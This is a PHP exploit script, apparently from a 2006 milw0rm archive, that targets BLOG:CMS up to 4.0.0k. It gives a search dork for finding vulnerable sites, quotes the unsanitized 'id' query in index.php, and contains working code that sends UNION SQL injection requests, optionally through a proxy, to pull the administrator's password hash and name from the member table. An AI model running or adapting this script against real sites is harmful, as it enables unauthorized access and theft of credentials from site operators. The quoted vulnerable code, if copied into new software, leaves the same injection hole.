#!/usr/bin/php -q -d short_open_tag=on
<?
echo "BLOG:CMS <= 4.0.0k sql injection/admin credentials disclosure exploit\n";
echo "by rgod rgod@autistici.org\n";
echo "site: http://retrogod.altervista.org\n";
echo "dork: \"Powered by BLOG:CMS\"|\"Powered by blogcms.com\"|\"2003-2004, Radek Hulán\"\n\n";

if ($argc<3) {
echo "Usage: php ".$argv[0]." host path OPTIONS\n";
echo "host:      target server (ip/hostname)\n";
echo "path:      path to BLOG:CMS\n";
echo "Options:\n";
echo "   -p[port]:    specify a port other than 80\n";
echo "   -P[ip:port]: specify a proxy\n";
echo "   -T[prefix]:  specify a table prefix (default: none)\n";
echo "Example:\n";
echo "php ".$argv[0]." localhost /blog/\n";
die;
}
/* software site: http://blogcms.com/

  i) vulnerable code in index.php, lines 19-36:

   ...
// NP_SEO plugin redirect
if (isset($_GET['id'])){
  $query=sql_query("select url from ".sql_table("plug_seo")." where id='".undoMagic($_GET['id'])."'");
  if ($row=sql_fetch_object($query)) {
   $row->url=stripslashes($row->url);
   $redirect=true;
   if (strpos($row->url,'|noseo|')!==false) {
    $arr=explode(",",'msnbot,googlebot,crawler,centrum');
    foreach ($arr as $s) if (strstr($_SERVER["HTTP_USER_AGENT"],$s)) $redirect=false;
    $arr=explode(",",'downloader.seznam,inktomi,yahoo,altavista,fasttrack,excite,hotbot,alltheweb,yahoo');
    $dns = strtolower(@gethostbyaddr($_SERVER["REMOTE_ADDR"]));
    foreach ($arr as $s) if (strstr($dns,$s)) $redirect=false;
    $row->url=str_replace('|noseo|','',$row->url);
  }
  if ($redirect) header('Location: '.unhtmlentities($row->url));
 }
 unset($query);
}
   ...

  "id" argument is not sanitized before to be used in a sql query...
  also you can inject sql statements regardless of magic_quotes_gpc settings,
  look at undoMagic() function in vars4.1.0.php:

  // removes magic quotes if that option is enabled
  function undoMagic($data) {
	return get_magic_quotes_gpc() ? stripslashes($data) : $data;
  }

  very nice code :)
            								      */


error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
$prefix="";
for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
  $prefix=str_replace("-T","",$argv[$i]);
}
}

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$sql="9999999'/**/UNION/**/SELECT/**/mpassword/**/FROM/**/".$prefix."nucleus_member/**/WHERE/**/mnumber=1/*"; //id = 2, admin
$sql=urlencode($sql);
$packet ="GET ".$p."?id=$sql HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp=explode("Location: ",$html);
$temp2=explode("\n",$temp[1]);
$temp2[0]=trim($temp2[0]);
if (($temp2[0]<>"") and (!strstr($temp2[0],"http")) and (!strstr($temp2[0],"UNION")))
{
  if (strlen($temp2[0])==40) {$type="sha1";}
  if (strlen($temp2[0])==32) {$type="md5";}
  echo "exploit succeded...\n";
  echo "password (".$type.")-> ".$temp2[0]."\n";
  $sql="9999999'/**/UNION/**/SELECT/**/mrealname/**/FROM/**/".$prefix."nucleus_member/**/WHERE mnumber=1/*";
  $sql=urlencode($sql);
  $packet ="GET ".$p."?id=$sql HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  sendpacketii($packet);
  $temp=explode("Location: ",$html);
  $temp2=explode("\n",$temp[1]);
  echo "admin -> ".$temp2[0]."\n";
}
else
{
//debug
echo $html."\r\n";
echo "exploit failed... see html\n";
}
?>

# milw0rm.com [2006-06-28]
